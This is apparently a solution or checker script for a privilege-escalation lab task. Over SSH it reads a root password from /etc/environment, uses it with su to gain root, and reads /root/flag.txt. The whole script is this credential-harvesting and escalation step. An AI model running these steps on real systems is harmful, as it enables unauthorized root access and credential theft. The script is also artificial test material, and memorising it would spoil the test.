#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'pass=$(grep ROOT_PASS= /etc/environment | cut -d= -f2); echo "$pass" | su - root -c "cat /root/flag.txt" 2>/dev/null')"
assert_root_output "${out}"
